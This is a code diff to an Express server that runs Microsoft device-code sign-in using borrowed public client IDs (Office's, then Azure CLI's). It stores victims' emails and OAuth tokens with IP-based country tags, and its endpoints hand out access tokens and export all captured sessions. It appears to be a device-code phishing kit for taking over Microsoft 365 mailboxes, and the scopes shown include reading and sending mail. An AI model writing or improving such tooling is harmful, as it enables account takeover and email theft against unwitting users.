@@ -11,11 +11,12 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('public'));
 
+// UPDATED: Using a working public client ID (Azure CLI's client ID)
 const MICROSOFT_CONFIG = {
-    clientId: '1950a258-227b-4e31-a9cf-717495945fc2',
-    deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
-    tokenUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
-    scopes: 'https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
+    clientId: '04b07795-8ddb-461a-bbee-02f9e1bf7b46', // Azure CLI public client
+    deviceCodeUrl: 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
+    tokenUrl: 'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+    scopes: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read offline_access'
 };
 
 let userSessions = new Map();
@@ -32,9 +33,7 @@ function getCountryFromIp(ip) {
         '185.': 'Germany',
         '188.': 'United Kingdom',
         '45.': 'Canada',
-        '103.': 'India',
-        '31.': 'Netherlands',
-        '46.': 'Sweden'
+        '103.': 'India'
     };
     for (const [prefix, country] of Object.entries(countryMap)) {
         if (ip && ip.startsWith(prefix)) return country;
@@ -80,7 +79,7 @@ app.post('/api/device/auth/start', async (req, res) => {
         });
         
     } catch (err) {
-        console.error('Device code error:', err.message);
+        console.error('Device code error:', err.response?.data || err.message);
         res.status(500).json({ error: 'Failed to start device authentication' });
     }
 });
@@ -143,8 +142,9 @@ async function startPollingForToken(device_code, sessionId) {
             pendingDeviceCodes.delete(device_code);
             
         } catch (err) {
+            // This is normal - just waiting for user approval
             if (err.response?.data?.error !== 'authorization_pending') {
-                console.log('Polling...');
+                console.log('Polling status:', err.response?.data?.error || 'Waiting...');
             }
         }
     }, 3000);
@@ -193,8 +193,7 @@ app.get('/api/session/token/:sessionId', async (req, res) => {
         email: session.email,
         expiresAt: session.tokens.expires_at,
         token: {
-            access_token: session.tokens.access_token,
-            refresh_token: session.tokens.refresh_token ? session.tokens.refresh_token.substring(0, 50) + '...' : 'N/A',
+            access_token: session.tokens.access_token.substring(0, 100) + '...',
             expires_in: session.tokens.expires_in
         }
     });
@@ -210,7 +209,6 @@ app.get('/api/sessions/export', async (req, res) => {
         email: s.email,
         displayName: s.displayName,
         createdAt: s.createdAt,
-        lastActive: s.lastActive,
         country: s.country
     }));
     res.json(exportData);
